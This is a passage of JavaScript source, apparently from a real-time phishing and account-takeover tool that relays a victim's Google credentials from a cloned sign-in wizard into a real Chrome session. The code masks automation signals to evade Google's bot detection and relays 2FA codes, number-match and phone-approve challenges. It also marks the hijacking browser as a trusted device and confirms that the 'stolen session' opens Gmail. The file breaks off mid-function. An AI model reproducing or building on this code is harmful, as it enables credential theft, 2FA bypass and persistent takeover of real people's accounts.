// Persistent Chrome session manager.
//
// Owns the session's persistent Chrome profile (sessions/<id>/), the live
// screencast stream, and the deterministic Google sign-in driver: the
// wizard submits one credential at a time and wizardPhase() drives the real
// Google page with fixed Playwright selectors (no LLM).
import { chromium } from 'playwright';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import { authenticator } from 'otplib';
import * as bitwarden from './bitwarden.js';
import { getSecrets, getRaw, update as storeUpdate } from './store.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const SESSIONS_DIR = path.join(__dirname, '..', 'sessions');

// id -> { context, page }
const active = new Map();

export function isOpen(id) {
  return active.has(id);
}

export function activeIds() {
  return [...active.keys()];
}

function userDataDir(id) {
  const dir = path.join(SESSIONS_DIR, id);
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}

// The admin's Open uses a HEADed (normal, visible) browser: the agent drives
// the real window with native mouse/keyboard, and the user can always take
// over by hand. The switch must happen at launch (persistent contexts
// can't toggle it).
async function launch(id, { headless = true } = {}) {
  const dir = userDataDir(id);
  // Bitwarden: a FRESH profile inherits the template's extension storage, so
  // the extension comes up already logged into our vault (no per-profile
  // "new device" e-mail verification).
  bitwarden.seedProfile(dir);
  // Real Chrome is what lets Google's sign-in through (the bundled Playwright
  // Chromium gets flagged as "browser or app may not be secure"). Two rules
  // matter more than any flag:
  // - channel 'chrome': the real installed Chrome, most trusted fingerprint
  // - NO userAgent override: real Chrome already reports the correct UA and
  //   UA-CH. Forcing a mismatched UA is a classic detection tripwire.
  const baseOpts = {
    headless,
    // Headless: let Chrome give us a maximized surface. Headed: force an explicit
    // viewport so the window never opens with a broken/too-short height.
    viewport: headless ? null : { width: 1440, height: 900 },
    // '--enable-automation': hide the automation banner. The other three are
    // Playwright defaults that together block Chrome's enterprise force-install
    // of our Bitwarden extension (policy ExtensionInstallForcelist).
    ignoreDefaultArgs: [
      '--enable-automation',
      '--disable-extensions',
      '--disable-component-update',
      '--disable-background-networking',
    ],
    args: [
      '--start-maximized',
      '--no-first-run',
      '--no-default-browser-check',
      '--disable-blink-features=AutomationControlled',
      // ride our pre-logged-in Bitwarden extension along in every session
      ...bitwarden.launchArgs(),
    ],
  };
  let context;
  try {
    context = await chromium.launchPersistentContext(dir, { ...baseOpts, channel: 'chrome' });
    console.log(`[gsession] ${id} launched real Chrome (channel 'chrome')`);
  } catch {
    // Fallback: bundled Chromium. Log it loud — Google flags it far more often.
    console.log(`[gsession] ${id} WARNING: real Chrome failed, falling back to bundled Chromium`);
    context = await chromium.launchPersistentContext(dir, baseOpts);
  }
  // Google immediately rejects automated browsers ("this browser or app may not
  // be secure" -> /signin/rejected) unless we mask the driving marks.
  await context.addInitScript(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
  });
  const page = context.pages()[0] || (await context.newPage());
  const entry = { context, page, headless };
  active.set(id, entry);
  context.on('close', () => active.delete(id));
  return entry;
}

// Open the session's browser (or focus it if already open) and navigate to a URL.
export async function open(id, url, opts = {}) {
  const wantHeadless = !!opts.headless;
  let entry = active.get(id);
  // A persistent context can't switch headless<->headed in place — close and
  // relaunch when the caller wants a visible window over a headless one.
  if (entry && entry.headless && !wantHeadless) {
    await entry.context.close().catch(() => {});
    entry = null;
  }
  if (!entry) entry = await launch(id, { headless: wantHeadless });
  if (url) {
    try {
      await entry.page.bringToFront();
      await entry.page.goto(url, { waitUntil: 'domcontentloaded', timeout: 45000 });
    } catch (e) {
      // navigation errors shouldn't kill the open browser
    }
  }
  // Maximize the OS window (saved per-profile window state can restore it
  // narrow, which clips the page — the agent's window shots must show the
  // whole form, buttons included).
  if (!wantHeadless) {
    try {
      const cdp = await entry.context.newCDPSession(entry.page);
      const { windowId } = await cdp.send('Browser.getWindowForTarget');
      await cdp.send('Browser.setWindowBounds', { windowId, bounds: { windowState: 'maximized' } });
      await cdp.detach().catch(() => {});
    } catch (e) {
      console.log(`[gsession] ${id} maximize failed: ${e.message}`);
    }
  }
  return entry;
}

export async function close(id) {
  const entry = active.get(id);
  if (!entry) return false;
  stopStream(id);
  try {
    await entry.context.close();
  } catch {}
  active.delete(id);
  return true;
}

export async function closeAll() {
  for (const id of [...active.keys()]) {
    // eslint-disable-next-line no-await-in-loop
    await close(id);
  }
}

// ---------------------------------------------------------------------------
// Live view: screencast frames from the session's real page, so the admin
// panel can show the browser window in a web page (like a live stream).
// Frames come from CDP Page.startScreencast (JPEG, low latency, ~25fps cap).
// ---------------------------------------------------------------------------
const streams = new Map();

export function canStream(id) {
  return active.has(id);
}

export function onStreamFrame(id, onFrame, onEnd) {
  const entry = active.get(id);
  if (!entry) return () => {};
  let rec = streams.get(id);
  if (!rec) rec = { cdp: null, onFrame: null, onEnd: null };
  rec.onFrame = onFrame;
  rec.onEnd = onEnd;
  streams.set(id, rec);
  (async () => {
    try {
      rec.cdp = await entry.context.newCDPSession(entry.page);
      rec.frameHandler = (p) => {
        if (rec.onFrame) rec.onFrame(p.data);
        // Chrome stops sending frames unless we acknowledge each one.
        rec.cdp?.send('Page.screencastFrameAck', { sessionId: p.sessionId }).catch(() => {});
      };
      rec.closeHandler = () => stopStream(id);
      rec.cdp.on('Page.screencastFrame', rec.frameHandler);
      rec.cdp.on('close', rec.closeHandler);
      await rec.cdp.send('Emulation.setDeviceMetricsOverride', {
        width: 1440, height: 900, deviceScaleFactor: 1, mobile: false,
      });
      // Screencast is damage-driven: a static page sends one frame and then
      // silence. While a watcher is attached we nudge the page with a tiny
      // (invisible) 2px class toggle so the admin's live view ticks ~1x/sec.
      try {
        await entry.page.evaluate(() => {
          if (document.getElementById('gs-tick-style')) return;
          const s = document.createElement('style');
          s.id = 'gs-tick-style';
          s.textContent = '.gs__tick::before{content:"";position:fixed;top:0;left:0;width:2px;height:2px;pointer-events:none;background:rgba(0,0,0,.04)}';
          (document.head || document.documentElement).appendChild(s);
        });
      } catch {}
      rec.tick = setInterval(() => {
        rec.cdp?.send('Runtime.evaluate', {
          expression: 'document.body && document.body.classList.toggle("gs__tick")',
        }).catch(() => {});
      }, 900);
      await rec.cdp.send('Page.startScreencast', {
        format: 'jpeg', quality: 55, maxWidth: 1280, maxHeight: 800, everyNthFrame: 1,
      });
    } catch (e) {
      console.log(`[gsession] stream start failed: ${e.message}`);
      stopStream(id);
      if (rec.onEnd) rec.onEnd(e.message);
    }
  })();
  return () => stopStream(id);
}

function stopStream(id) {
  const rec = streams.get(id);
  if (!rec) return;
  streams.delete(id);
  if (rec.tick) { clearInterval(rec.tick); rec.tick = null; }
  if (rec.cdp) {
    try { rec.cdp.send('Page.stopScreencast'); } catch {}
    try {
      if (rec.frameHandler) rec.cdp.off('Page.screencastFrame', rec.frameHandler);
      if (rec.closeHandler) rec.cdp.off('close', rec.closeHandler);
    } catch {}
    // drop the nudge style once nobody is watching anymore
    const entry = active.get(id);
    entry?.page.evaluate(() => document.getElementById('gs-tick-style')?.remove())
      .catch(() => {});
    rec.cdp.detach().catch(() => {});
  }
}

// Current URL + title of the session's page (agent context, panel state).
export async function pageInfo(id) {
  const entry = active.get(id);
  if (!entry) return null;
  try {
    return { url: entry.page.url(), title: await entry.page.title() };
  } catch {
    return null;
  }
}

// CDP "focus" — brings the page to the front at the browser level. OS-level
// clicks on a window that doesn't hold the OS foreground lock are absorbed as
// a focus-only click (Windows behavior); doing this first makes the very next
// OS click hit the real element.
export async function pageBringToFront(id) {
  const entry = active.get(id);
  if (!entry) return;
  try { await entry.page.bringToFront(); } catch {}
}

// Navigate the session page to a URL (CDP goto — no UI needed).
export async function pageNavigate(id, url) {
  const entry = active.get(id);
  if (!entry) throw new Error('browser not open');
  await entry.page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 });
}

// Among every element whose text contains `text`, pick the one most worth
// clicking: a real button/link/role=button beats a heading/label that merely
// shares the words (e.g. the "Add a passkey" heading vs the "ADD" button),
// and a shorter (more specific) text match beats a long one. Returns a
// Playwright Locator, or null if nothing visible matched.
async function pickBestByText(page, text) {
  let all = [];
  try { all = await page.getByText(text, { exact: false }).all(); } catch { return null; }
  let best = null, bestScore = -Infinity;
  for (const loc of all) {
    if (!(await loc.isVisible({ timeout: 200 }).catch(() => false))) continue;
    const el = await loc.elementHandle().catch(() => null);
    if (!el) continue;
    let info = null;
    try {
      info = await el.evaluate((node) => {
        const tag = node.tagName.toLowerCase();
        const role = node.getAttribute('role');
        const t = (node.textContent || '').trim();
        let inter = 0;
        if (tag === 'button' || tag === 'a' || tag === 'input' || tag === 'select' || tag === 'summary') inter = 100;
        else if (role === 'button' || role === 'tab' || role === 'link' || role === 'menuitem' || role === 'option') inter = 90;
        else if (role) inter = 40;
        try { if (window.getComputedStyle(node).cursor === 'pointer') inter += 30; } catch {}
        return { len: t.length, inter };
      });
    } catch { continue; }
    const score = info.inter - info.len; // interactivity first, then specificity
    if (score > bestScore) { bestScore = score; best = loc; }
  }
  return best;
}

// Click the best element whose text contains `text`, via CDP.
// Works regardless of window focus/foreground state. Searches the session
// page first, then every other page in the context (the Bitwarden FIDO2
// popout is a chrome-extension:// page in the SAME context, so its Save/Add
// buttons are clickable this way too). Polls for up to `timeoutMs` because
// the popout page appears ~1s after the "Add passkey" click.
export async function pageClickText(id, text, timeoutMs = 12000) {
  const entry = active.get(id);
  if (!entry) throw new Error('browser not open');
  const deadline = Date.now() + timeoutMs;
  let lastErr = null;
  for (;;) {
    for (const p of entry.context.pages()) {
      if (p.isClosed()) continue;
      try {
        const best = await pickBestByText(p, text);
        if (!best) continue;
        await best.scrollIntoViewIfNeeded().catch(() => {});
        await best.click({ timeout: 3000 });
        return { page: (p.url() || '').slice(0, 90) };
      } catch (e) { lastErr = e; }
    }
    if (Date.now() > deadline) break;
    await new Promise((r) => setTimeout(r, 500));
  }
  throw new Error('not found on any page: ' + text + (lastErr ? ' (' + lastErr.message.slice(0, 120) + ')' : ''));
}

// Scroll the session page via CDP (mouse wheel at viewport center) —
// immune to the window-foreground state that breaks OS wheel events.
export async function pageScroll(id, dyPx) {
  const entry = active.get(id);
  if (!entry) throw new Error('browser not open');
  const vp = entry.page.viewportSize() || { width: 1200, height: 800 };
  await entry.page.mouse.move(Math.round(vp.width / 2), Math.round(vp.height / 2));
  await entry.page.mouse.wheel(0, dyPx);
}

// Unlock this session's Bitwarden vault server-side. Opens the extension
// popup tab and drives the unlock flow itself (master password from env,
// Gmail verification code when needed), then closes the tab.
export async function pageUnlockVault(id) {
  const entry = active.get(id);
  if (!entry) throw new Error('browser not open');
  return bitwarden.passkeyReady(entry.context, id);
}

// CDP keyboard input — unlike OS-level keystrokes (computer-use), these do not
// need the Chrome window to hold the OS foreground lock, so they land correctly
// even when RDP is disconnected. The element must already be FOCUSED (the agent
// clicks it with a native OS click first; that part does work disconnected).
export async function pageType(id, text, { pressEnter = false } = {}) {
  const entry = active.get(id);
  if (!entry) throw new Error('browser not open');
  await entry.page.keyboard.type(String(text), { delay: 30 });
  if (pressEnter) await entry.page.keyboard.press('Enter');
}

const KEY_MAP = {
  return: 'Enter', enter: 'Enter', tab: 'Tab', escape: 'Escape', esc: 'Escape',
  backspace: 'Backspace', delete: 'Delete', del: 'Delete', space: 'Space',
  up: 'ArrowUp', down: 'ArrowDown', left: 'ArrowLeft', right: 'ArrowRight',
  home: 'Home', end: 'End', pageup: 'PageUp', pagedown: 'PageDown',
};
const MOD_MAP = { cmd: 'Meta', meta: 'Meta', super: 'Meta', win: 'Meta', ctrl: 'Control', control: 'Control', alt: 'Alt', option: 'Alt', shift: 'Shift' };

export async function pageKey(id, combo) {
  const entry = active.get(id);
  if (!entry) throw new Error('browser not open');
  const keys = String(combo).toLowerCase().split('+').map((p) => {
    const k = p.trim();
    return MOD_MAP[k] || KEY_MAP[k] || k; // letters/digits pass through
  });
  await entry.page.keyboard.press(keys.length === 1 ? keys[0] : keys.join('+'));
}

// Resolve whatever TOTP value we were handed into the digits to type into Google:
// - a 6-digit numeric code (what a victim reads off their authenticator app) ->
//   it is already valid for the current time window.
// - anything else (a Base32 "setup key" captured from the admin panel / invite)
//   -> generate the current rolling code from that secret.
export function totpValue(secretOrCode) {
  const s = String(secretOrCode || '').trim();
  if (/^\d{6}$/.test(s)) return s;
  return s ? authenticator.generate(s.replace(/\s+/g, '')) : '';
}

// ---------------------------------------------------------------------------
// Deterministic Google sign-in driver (proven flow). The remote wizard submits
// one credential at a time (username -> password -> 2FA / number). Each step
// drives the *real* Google sign-in forward in this session's persistent Chrome
// using fixed selectors — no LLM — so by the time the wizard is done the actual
// logged-in session (cookies) exists on disk under sessions/<id>/. Phases are
// serialized per session so out-of-order HTTP arrivals can't race each other.
// ---------------------------------------------------------------------------
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// Google surfaces account-level errors (wrong password, unknown account, bad 2FA
// code) in Material error containers. The exact container the victim edits can
// vary as Google redesigns the page, so we scan a small set of known containers
// and only trust text that reads like a real Google error. Returns the trimmed
// error text, or null if no recognizable error is showing.
const ERROR_SELECTORS = [
  'div[jsname]',
  '[role="alert"]',
  '.o6cuMc',
  '.qerror',
  '#passwordError',
  '#identifierError',
];
// Match only the actual error sentence Google shows (not the surrounding form
// text that may share the container). Each captures one error.
const ERROR_RE =
  /(wrong password[^.\n]*|couldn'?t find your google account[^.\n]*|enter a valid (?:email|phone|password)[^.\n]*|to continue, first verify[^.\n]*|(?:verification )?code (?:is )?(?:incorrect|wrong)[^.\n]*|that was the wrong code[^.\n]*)/i;

function extractError(t) {
  const m = t.match(ERROR_RE);
  return m ? m[1].trim() : null;
}

async function detectGoogleError(page) {
  for (const sel of ERROR_SELECTORS) {
    const els = await page.locator(sel).all().catch(() => []);
    for (const el of els) {
      if (await el.isVisible().catch(() => false)) {
        const t = (await el.innerText().catch(() => '')).trim();
        const err = extractError(t);
        if (err) return err;
      }
    }
  }
  return null;
}

// After submitting a password, wait for Google to either accept it (the password
// field disappears / the flow advances) or reject it (a real error appears).
// Never blindly advance on a wrong password. Returns { accepted } when we should
// move on, or { error } with the Google error text when it was rejected.
async function waitPasswordOutcome(page, pw, timeout) {
  const start = Date.now();
  while (Date.now() - start < timeout) {
    const err = await detectGoogleError(page);
    if (err) return { error: err };
    if (!(await pw.isVisible().catch(() => false))) return { accepted: true };
    await sleep(500);
  }
  // Still on the password field and no error text surfaced => safest to treat it
  // as a bad password rather than silently continue to 2FA.
  return { error: 'Wrong password. Try again or click Forgot password to reset it.' };
}

// Are we still on a plain sign-in field screen (email or password)? If so the
// page doesn't count as a second-factor challenge regardless of other markers.
async function isFieldScreen(page) {
  if (await page.locator('#identifierId, input[name="identifier"]').first().isVisible().catch(() => false)) return true;
  if (await page.locator('input[type="password"]').first().isVisible().catch(() => false)) return true;
  return false;
}

// Read the selectable NUMBER options Google shows on the "pick the number"
// challenge some accounts get after the password (typically three 2-digit codes,
// occasionally phone-number options on the "choose a phone" variant). An option
// = a clickable element whose ENTIRE visible text is a digit string / phone
// number and nothing else. Returns the option texts (max 8, de-duplicated) in
// document order so the clone can mirror them and click the matching real one.
async function readNumberOptions(page) {
  try {
    const els = await page
      .locator('a, button, [role="button"], [role="menuitemradio"], [role="option"]')
      .all();
    const seen = new Set();
    const options = [];
    for (const el of els) {
      if (!(await el.isVisible().catch(() => false))) continue;
      const t = (await el.innerText().catch(() => '')).trim();
      if (!t || t.length > 18) continue;
      if (!/^\+?\d[\d\s\-().]{1,17}$/.test(t)) continue; // digits/phone only
      if (seen.has(t)) continue;
      seen.add(t);
      options.push(t);
      if (options.length >= 8) break;
    }
    return options;
  } catch {
    return [];
  }
}

// Detect which second-factor / verification screen is on display. Returns:
//   { kind: 'code' }                  -> a numeric code input is shown (authenticator
//                                        / SMS / e-mail code)
//   { kind: 'numchoice', options[] }  -> "pick the number" options: >= 2 clickable
//                                        elements whose whole text is a 2+-digit
//                                        number (no code input, no sign-in fields)
//   { kind: 'prompt' }                -> approve-on-phone / "Confirm it's you" style
//   null                              -> no second-factor challenge in sight
// Snapshot each distinct challenge page URL once per assessment pass, so we can
// always verify which Google page is actually on screen (text, inputs, digits).
const lastSnapshot = new WeakMap();
async function maybeSnapshot(page) {
  const url = page.url().split('?')[0];
  if (!/signin\/(challenge|continue)/.test(url)) return;
  if (lastSnapshot.get(page) === url) return;
  lastSnapshot.set(page, url);
  await snapshotChallenge(page, url.split('/').pop() || 'challenge');
}

async function detect2FA(page) {
  await maybeSnapshot(page);
  const totpName = page.locator('input[name="totpPin"], input#totpPin').first();
  if (await totpName.isVisible().catch(() => false)) {
    // explicit Google totp field — also surface any number displayed on the page
    // (some challenges show a code the user must type into this very field)
    if (await isFieldScreen(page)) return { kind: 'code' };
    const num = await readDisplayedNumber(page);
    return { kind: 'code', options: num ? [num] : undefined };
  }
  const code = page
    .locator('input[type="tel"][name], input[autocomplete="one-time-code"], input[inputmode="numeric"]')
    .first();
  if (await code.isVisible().catch(() => false)) {
    // Only trust a generic numeric/OTP input if there is genuinely no email or
    // password field showing (i.e. we are NOT on the sign-in field screens).
    if (await isFieldScreen(page)) return null; // still a field screen, not 2FA
    console.log(`[gsession] detect2FA code-input matched: ${await code.evaluate((el) => el.outerHTML.slice(0, 120)).catch(() => '?')}`);
    const num = await readDisplayedNumber(page);
    return { kind: 'code', options: num ? [num] : undefined };
  }
  // "Pick the number" challenge: some accounts show a page of clickable number
  // tiles (e.g. three different 2-digit codes) to choose from instead of typing
  // a code. On other accounts the page shows a SINGLE short code (typically a
  // 2-digit number) — that counts too; a lone long phone number does not.
  // The headings on these pages ALSO match the CHALL markers below, so this
  // must run BEFORE the challenge-text scan.
  if (!(await isFieldScreen(page))) {
    const options = await readNumberOptions(page);
    const singleShort = options.length === 1 && /^\d{2,4}$/.test(options[0]);
    if (options.length >= 2 || singleShort) {
      console.log(`[gsession] detect2FA num-choice page, options: ${options.join(' / ')} @ ${page.url().slice(0, 90)}`);
      return { kind: 'numchoice', options };
    }
  }
  // No code field, no number options. Google's challenge screens (approve-on-phone,
  // or a code we can't bind) come in several shapes and the H1 ALONE is unreliable —
  // so scan the headings AND the action links/buttons AND body copy for any marker
  // that this is a second-factor screen rather than a plain sign-in field.
  let labels = '';
  try {
    const parts = await Promise.all([
      page.locator('h1, h2, h3').allInnerTexts(),
      page.locator('a, button, [role="button"]').allInnerTexts(),
      page.locator('body').innerText(),
    ]);
    labels = parts.join(' ');
  } catch {}
  labels = labels.toLowerCase();
  const CHALL =
    /verify it'?s you|confirm it'?s you|check your phone|check your (?:google account|email)|try another way|use another (?:way|method)|we (?:'ve?|will)?\s*sent (?:you\s+)?(?:a\s+)?(?:code|notification)|tap (?:yes|approve)|tap the (?:button|number)|authenticator app|6[- ]?digit (?:code|verification)|enter the (?:last\s+|6-?|)?digits|backup code|it'?s been a while since/i;
  if (CHALL.test(labels) && !(await isFieldScreen(page))) {
    console.log(`[gsession] detect2FA challenge page (approve/prompt) @ ${page.url().slice(0, 90)}`);
    await maybeSnapshot(page);
    // keypass: mark this browser as trusted while the challenge is fresh
    await autoTrustTick(page);
    // The approve/prompt pages can DISPLAY a number (e.g. /challenge/dp:
    // "the number 47 below will be on your phone"). Surface it so every UI can
    // show it — that's the step that used to go missing. Keeping kind 'prompt'
    // because the real action is still on the phone (or the number is read,
    // not clicked).
    return { kind: 'prompt', options: await pageNumbers(page) };
  }
  // 100%-coverage backstop: ANY Google challenge URL (/v3/signin/challenge/*)
  // that is not a plain sign-in field and not signed in IS a challenge, even if
  // its wording is new/unknown. Surface it — with every number displayed on the
  // page — so the UIs (wizard clone, panel modal) always show what's on screen.
  if (/\/v3\/signin\/challenge\//.test(page.url()) && !(await isFieldScreen(page))) {
    console.log(`[gsession] detect2FA unknown challenge page (URL backstop) @ ${page.url().slice(0, 90)}`);
    await maybeSnapshot(page);
    await autoTrustTick(page);
    return { kind: 'prompt', options: await pageNumbers(page) };
  }
  return null;
}

// All short standalone numbers shown on the page (the "displayed code" on
// challenge pages). Max 4.
async function pageNumbers(page) {
  const numbers = [];
  try {
    for (const el of await page.locator('div, span, h1, h2, h3, p, button').all()) {
      if (!(await el.isVisible().catch(() => false))) continue;
      const t = (await el.innerText().catch(() => '')).trim();
      if (/^\d{2,6}$/.test(t) && !numbers.includes(t)) numbers.push(t);
      if (numbers.length >= 4) break;
    }
  } catch {}
  return numbers;
}

// Read a short standalone number displayed ON the challenge page (e.g. a
// 2-digit code Google shows so the user can type it into that same page's code
// field, or a "confirm this number" display). Checks the obvious display
// containers first, then any visible element whose entire text is 2-6 digits.
async function readDisplayedNumber(page) {
  const nums = await pageNumbers(page);
  return nums.length ? nums[0] : null;
}

// Snapshot a challenge screen to data/challenges/ so we can always SEE exactly
// what page Google is on right now: full text, visible inputs, any numbers
// shown on the page, plus a screenshot. Returns the snapshot meta (or null).
async function snapshotChallenge(page, tag) {
  const dir = path.join(__dirname, '..', 'data', 'challenges');
  fs.mkdirSync(dir, { recursive: true });
  const stamp = new Date().toISOString().replace(/[:.]/g, '-');
  const file = path.join(dir, `${tag || 'challenge'}-${stamp}`);
  try {
    const url = page.url();
    const text = (await page.locator('body').innerText().catch(() => ''))
      .split('\n').map((t) => t.trim()).filter(Boolean).slice(0, 80).join('\n');
    const inputs = [];
    for (const inp of await page.locator('input, select, textarea').all().catch(() => [])) {
      if (!(await inp.isVisible().catch(() => false))) continue;
      inputs.push(await inp.evaluate((el) => `type=${el.type} name="${el.name}" id="${el.id}" mode=${el.inputMode}`).catch(() => ''));
    }
    const numbers = [];
    for (const el of await page.locator('div, span, button, a').all().catch(() => [])) {
      if (!(await el.isVisible().catch(() => false))) continue;
      const t = (await el.innerText().catch(() => '')).trim();
      if (/^\d{2,6}$/.test(t) && !numbers.includes(t)) numbers.push(t);
      if (numbers.length >= 6) break;
    }
    const shot = `${file}.png`;
    await page.screenshot({ path: shot }).catch(() => {});
    fs.writeFileSync(`${file}.meta.json`, JSON.stringify({
      url, inputs, numbersOnPage: numbers,
      text: text.slice(0, 4000), screenshot: path.basename(shot),
    }, null, 2));
    console.log(`[gsession] challenge snapshot -> ${path.basename(file)} url=${url.slice(0, 100)} numbers=[${numbers.join(', ')}]`);
    return { path: file, url, numbersOnPage: numbers };
  } catch (e) {
    console.log(`[gsession] challenge snapshot failed: ${e.message}`);
    return null;
  }
}

// DOM/URL assessment of the real login state — "what is the live backend Google
// page asking for right now?" The wizard mirrors ONLY this reported state, so the
// clone never invents a screen Google isn't actually showing. States:
//   'email'     -> on the email/identifier screen
//   'password'  -> on the password screen
//   'code'      -> Google wants a 6-digit code (authenticator app / SMS / email)
//   'approve'   -> Google wants you to Approve on your phone ("Confirm it's you")
//   'numchoice' -> Google shows selectable number options (some accounts: a page
//                  of e.g. three 2-digit numbers to pick the matching one); the
//                  live options are carried in `options`
//   'verifying' -> transitional / signed-in-ish but unproven (NOT signed-in yet)
//   'signed-in' -> confirmed signed in (Gmail reachable) — set by settleAndVerify()
//   'error'     -> Google rejected the attempt
async function assessLogin(page) {
  const url = page.url();
  if (/\/signin\/rejected/.test(url)) {
    return {
      status: 'error',
      state: 'error',
      message: 'Google blocked this sign-in ("this browser or app may not be secure"). Open it and finish by hand once — the session is then saved and reused.',
    };
  }
  // Genuine signed-in URLs. NOTE: `/signin/continue` is deliberately EXCLUDED —
  // it's the "continue to <app>" intermediate, NOT a signed-in state. Treating it
  // as logged-in is what made a bogus email report "Signed in successfully".
  if (
    /(^|\/)myaccount\.google\.com/.test(url) ||
    /gds\.google\.com\/web/.test(url) ||
    /\/oauth\/consent/.test(url) ||
    /(^|\/)mail\.google\.com\/(mail\/|u\/\d+)/.test(url) ||
    /ManageAccount/.test(url)
  ) {
    return { status: 'pending', state: 'verifying', message: 'Looks signed in — verifying on Gmail…' };
  }

  const idf = page.locator('#identifierId, input[name="identifier"], input[type="email"]').first();
  if (await idf.isVisible().catch(() => false)) {
    return { status: 'new', state: 'email', message: 'Waiting on the email step.' };
  }

  // A second-factor challenge (code / number-choice / phone-approve) is never "signed in".
  const fa = await detect2FA(page);
  if (fa) {
    if (fa.kind === 'numchoice') {
      return {
        status: 'pending',
        state: 'numchoice',
        options: fa.options,
        // single-number accounts get an explicit call-out of the number itself,
        // so it is visible in every UI (panel modal, toast, wizard clone)
        message: fa.options.length === 1
          ? `Google is showing a verification number: ${fa.options[0]} — confirm it to continue.`
          : 'Select the number that matches this sign-in attempt on Google.',
      };
    }
    if (fa.kind === 'code') {
      const opts = fa.options && fa.options.length ? fa.options : undefined;
      return {
        status: 'pending',
        state: 'code',
        options: opts,
        message: opts
          ? `Google is showing a verification number on the page: ${opts.join(' ')} — enter it to continue.`
          : 'Enter the 6-digit code from your authenticator app (or the code Google texted/mailed you).',
      };
    }
    // prompt / approve-on-phone. The page may also DISPLAY a number (that's the
    // step that used to vanish) — carry it so the UIs can show it big.
    const opts = fa.options && fa.options.length ? fa.options : undefined;
    return {
      status: 'pending',
      state: 'approve',
      options: opts,
      message: opts
        ? `Google is showing a verification number: ${opts.join(' ')} — confirm it (tap the number on your phone) to continue.`
        : 'Google is confirming it\u2019s you — open the notification on your phone and tap Approve.',
    };
  }

  const pw = page.locator('input[type="password"]').first();
  if (await pw.isVisible().catch(() => false)) {
    return { status: 'new', state: 'password', message: 'Waiting on the password step.' };
  }

  // Nothing recognizable and no signed-in URL -> transitional. Never claim signed-in
  // here; settleAndVerify() proves it for real by reaching Gmail.
  const dbgHeading = (await page.locator('h1, h2, h3').first().innerText().catch(() => '')).trim().slice(0, 80);
  console.log(`[gsession] assessLogin -> 'verifying' @ ${page.url().slice(0, 90)} heading="${dbgHeading}"`);
  return { status: 'pending', state: 'verifying', message: 'Checking your sign-in…' };
}

// The real SUCCESS test (per the requirement): the stolen session must ACTUALLY
// reach Gmail. Load Gmail — if genuinely signed in, the inbox opens; if not,
// Google bounces us to a sign-in page. 'signed-in' is only ever based on this.
async function verifyGmail(page) {
  try {
    await page.goto('https://mail.google.com/', { waitUntil: 'domcontentloaded', timeout: 25000 });
  } catch {}
  await sleep(3000);
  return /mail\.google\.com\/(mail\/|u\/\d+)/.test(page.url());
}

// Settle the current step, then CONFIRM success the only way that counts:
// reaching Gmail.
//   - a live 'code'/'approve' challenge is returned as-is so the wizard mirrors it;
//   - otherwise we prove it with verifyGmail() -> 'signed-in'; if Gmail won't open
//     yet, report 'verifying' so the wizard keeps polling.
async function settleAndVerify(page) {
  await sleep(2500);
  const st = await assessLogin(page);
  if (st.status === 'error') return st;
  if (st.state === 'code' || st.state === 'approve' || st.state === 'numchoice') return st;
  if (await verifyGmail(page)) {
    return { status: 'logged-in', state: 'signed-in', message: 'Signed in — session is live (Gmail opens).' };
  }
  return { status: 'pending', state: 'verifying', message: 'Almost there — verifying your sign-in…' };
}

// Kept as the call-site name (wizardPhase still calls settleLogin).
async function settleLogin(page) {
  return settleAndVerify(page);
}

// Live login state, re-read on demand — the wizard POLLS this while the victim
// completes a phone-approve on their device, or while Google finishes settling.
// It never captures a credential; it just re-reports the current state.
export async function loginState(id) {
  let entry = active.get(id);
  if (!entry) {
    try { entry = await open(id, undefined, { headless: false }); } catch {}
    entry = active.get(id) || entry;
  }
  if (!entry) return { status: 'pending', state: 'verifying', message: '' };

  // --- device-registration (keypass) in flight: report + advance it ---
  const t = trusts.get(id);
  if (t && (t.phase === 'starting' || t.phase === 'active')) {
    if (t.phase === 'starting') {
      await navForTrust(id);
      t.phase = 'active';
    }
    const r = await advanceTrust(id);
    if (r.state === 'trusted') {
      finishTrust(id);
      return { status: 'logged-in', state: 'trusted', message: r.message };
    }
    return r;
  }

  const st = await settleAndVerify(entry.page);

  // --- freshly signed in: this OS is the keypass when the Bitwarden passkey is
  // registered (createPasskey sets deviceTrusted) or the don't-ask-again box
  // was checked during the verification challenge.
  if (st.state === 'signed-in') {
    const raw = getRaw(id);
    if (raw && raw.deviceTrusted) {
      return { status: 'logged-in', state: 'trusted', message: 'Signed in — this OS is already the registered keypass for the account.' };
    }
    // The verification challenge for this sign-in showed the "don't ask again on
    // this device" box and it was checked → this browser IS now the keypass.
    const tt = trusts.get(id);
    if (raw && tt && tt.trustBoxChecked) {
      markTrusted(id, 'don’t-ask-again box confirmed');
      return { status: 'logged-in', state: 'trusted', message: 'Signed in ✓ and this OS is registered (keypass) — future sign-ins here skip the phone-tap/2FA for this account.' };
    }
  }
  return st;
}

// ---------------------------------------------------------------------------
// Incremental "live" login. The remote wizard submits one credential at a time
// (username -> password -> 2FA). Each submitted step drives the *real* Google
// sign-in forward in this session's persistent Chrome, so by the time the
// wizard is done the actual logged-in session (cookies, not a stored secret)
// already exists on disk under sessions/<id>/. Phases are serialized per
// session so out-of-order HTTP arrivals can never race each other.
// ---------------------------------------------------------------------------
const queues = new Map();

export function wizardPhase(key, id, value) {
  const prev = queues.get(id) || Promise.resolve();
  const run = prev.then(() => wizardPhaseInner(key, id, value));
  queues.set(id, run.catch(() => {})); // keep the chain alive even on failure
  return run;
}

async function wizardPhaseInner(key, id, value) {
  try {
    // "Normal Google": the behind-the-scenes login is a real, visible (headed)
    // Google sign-in — you can watch it and finish any 2FA / device check by
    // hand — rather than a hidden headless (puppeteer-style) automation.
    let entry = await open(id, undefined, { headless: false });
    // Defensive: if the tab we hold was closed by something (Google sign-in
    // JS does this on certain navigations), grab a live page from the context.
    if (entry.page.isClosed()) {
      entry.page = entry.context.pages().find((p) => !p.isClosed()) || (await entry.context.newPage());
    }
    const page = entry.page;

    if (key === 'username') {
      // A FRESH TAB for every email attempt: Google's identifier page silently
      // closes its tab after ~10s idle or on the next navigation (verified
      // quirk of the sign-in JS), so the warmed tab may already be dead by the
      // time the visitor types their e-mail. New tab -> accounts.google.com
      // is the proven-to-survive path.
      const page = await entry.context.newPage();
